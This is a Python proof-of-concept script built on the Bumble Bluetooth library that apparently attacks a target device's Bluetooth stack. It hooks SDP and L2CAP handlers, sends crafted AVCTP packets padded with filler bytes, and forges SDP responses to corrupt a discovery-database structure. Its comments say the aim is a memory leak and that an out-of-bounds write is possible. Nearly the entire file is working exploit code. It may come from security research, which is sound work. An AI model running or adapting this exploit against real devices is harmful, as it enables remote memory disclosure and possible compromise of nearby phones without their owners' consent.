import asyncio
import struct

import bumble.logging
from bumble import core, hci, rfcomm, transport, utils, hfp, sdp, avrcp, l2cap
from bumble.colors import color
from bumble.device import Connection, Device, DeviceConfiguration
from bumble.l2cap import ClassicChannelSpec

hci_transport = "android-netsim"
device_config = "device.json"
address = "DA:4C:10:DE:17:00"

# copied from Bumble's examples/run_hfp_gateway.py


def _default_configuration() -> hfp.AgConfiguration:
    return hfp.AgConfiguration(
        supported_ag_features=[
            hfp.AgFeature.HF_INDICATORS,
            hfp.AgFeature.IN_BAND_RING_TONE_CAPABILITY,
            hfp.AgFeature.REJECT_CALL,
            hfp.AgFeature.CODEC_NEGOTIATION,
            hfp.AgFeature.ESCO_S4_SETTINGS_SUPPORTED,
            hfp.AgFeature.ENHANCED_CALL_STATUS,
        ],
        supported_ag_indicators=[
            hfp.AgIndicatorState.call(),
            hfp.AgIndicatorState.callsetup(),
            hfp.AgIndicatorState.callheld(),
            hfp.AgIndicatorState.service(),
            hfp.AgIndicatorState.signal(),
            hfp.AgIndicatorState.roam(),
            hfp.AgIndicatorState.battchg(),
        ],
        supported_hf_indicators=[
            hfp.HfIndicator.ENHANCED_SAFETY,
            hfp.HfIndicator.BATTERY_LEVEL,
        ],
        supported_ag_call_hold_operations=[],
        supported_audio_codecs=[hfp.AudioCodec.CVSD, hfp.AudioCodec.MSBC],
    )


def AvctMakePacket(transaction_label, packet_type, is_command, ipid, pid,
                   payload):
    return (struct.pack(
        ">BH",
        transaction_label << 4
        | packet_type << 2
        | (0 if is_command else 1) << 1
        | (1 if ipid else 0),
        pid,
    ) + payload)


async def main():
    bumble.logging.setup_basic_logging("DEBUG")
    async with await transport.open_transport(hci_transport) as (
            hci_source,
            hci_sink,
    ):
        device = Device.from_config_file_with_hci(device_config, hci_source,
                                                  hci_sink)
        device.classic_enabled = True
        channel = 3
        configuration = _default_configuration()

        ag_sdp_record_handle = 0x00010001
        avrcp_controller_service_record_handle = 0x00010002
        avrcp_target_service_record_handle = 0x00010003

        device.sdp_service_records = {
            ag_sdp_record_handle:
            hfp.make_ag_sdp_records(1, ag_sdp_record_handle, configuration),
            avrcp_controller_service_record_handle:
            avrcp.make_controller_service_sdp_records(
                avrcp_controller_service_record_handle),
            avrcp_target_service_record_handle:
            avrcp.make_target_service_sdp_records(
                avrcp_controller_service_record_handle),
        }

        requests = []

        await device.power_on()
        connection = await device.connect(
            address, transport=core.PhysicalTransport.BR_EDR)
        await connection.encrypt()

        avrcp_protocol = avrcp.Protocol()
        avrcp_protocol.listen(device)
        await avrcp_protocol.connect(connection)

        await asyncio.sleep(
            1)  # TODO(zhuowei): wait for EVENT_CONNECTION instead

        def my_hook(request_):
            print("got SDP, doing NOTHING", request_)
            requests.append(request_)

        device.sdp_server.orig_on_sdp_service_search_attribute_request = device.sdp_server.on_sdp_service_search_attribute_request
        device.sdp_server.on_sdp_service_search_attribute_request = my_hook

        rfcomm_client = rfcomm.Client(connection)
        rfcomm_mux = await rfcomm_client.start()
        channel = await rfcomm_mux.open_dlc(4)
        print("open dlc!!!!!!!")
        await asyncio.sleep(0.5)
        await channel.disconnect()
        await asyncio.sleep(0.5)
        channel = await rfcomm_mux.open_dlc(4)
        await asyncio.sleep(0.5)

        configure_requests = []

        def my_on_configure_request_hook(request):
            print("configure - waiting", request)
            configure_requests.append(request)

        def event_connection_handler(channel):
            print("got channel, hooking...")
            channel.orig_on_configure_request = channel.on_configure_request
            channel.on_configure_request = my_on_configure_request_hook

        device.l2cap_channel_manager.servers[sdp.SDP_PSM].on(
            l2cap.ClassicChannelServer.EVENT_CONNECTION,
            event_connection_handler)

        device.sdp_server.send_response(
            sdp.SDP_ErrorResponse(
                transaction_id=requests[0].transaction_id,
                error_code=sdp.SDP_INVALID_SERVICE_RECORD_HANDLE_ERROR,
            ))
        await asyncio.sleep(0.5)
        # with 0xef as my filler:
        # 0000  00 00 02 01 0b 01 01 00 19 00 07 01 03 01 75 00   ..............u.
        # 0010  06 06 41 ef ef ef ef ef ef ef ef ef ef ef ef ef   ..A.............
        buf_offset = 0x13
        num_attr_filters_offset = 0x42
        avrcp_command_buf = b"A" * (
            num_attr_filters_offset - buf_offset) + struct.pack(
                "<H", 0)
        # technically you could set num_attr_filters_offset = big number to get a write out of bounds in sdpu_build_attrib_seq
        # but we're just going to use this to leak
        avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
            AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
                           0x4141, avrcp_command_buf))
        configure_requests[0].options = l2cap.L2CAP_Configure_Request.encode_configuration_options(            [
                (
                    l2cap.L2CAP_MAXIMUM_TRANSMISSION_UNIT_CONFIGURATION_OPTION_TYPE,
                    struct.pack('<H', 0x8000),
                )
            ])
        device.sdp_server.channel.orig_on_configure_request(
            configure_requests[0])
        await asyncio.sleep(0.5)
        tSDP_DISCOVERY_DB_raw_data_offset = 0x70
        # raw_data, raw_size, raw_used
        #avrcp_command_buf = b"A" * (
        #    tSDP_DISCOVERY_DB_raw_data_offset - buf_offset) + struct.pack(
        #        "<QII", 0x41414141_41414141, 0x41414141, 0x0) + b"\xef" * 0x80
        #avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
        #    AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
        #                   0x4141, avrcp_command_buf))
        device.sdp_server.send_response(
            sdp.SDP_ServiceSearchAttributeResponse(
                transaction_id=requests[1].transaction_id,
                attribute_lists_byte_count=0x100,
                attribute_lists=b"A" * 0x100,
                continuation_state=bytes([0])))
        await asyncio.sleep(4)


asyncio.run(main())
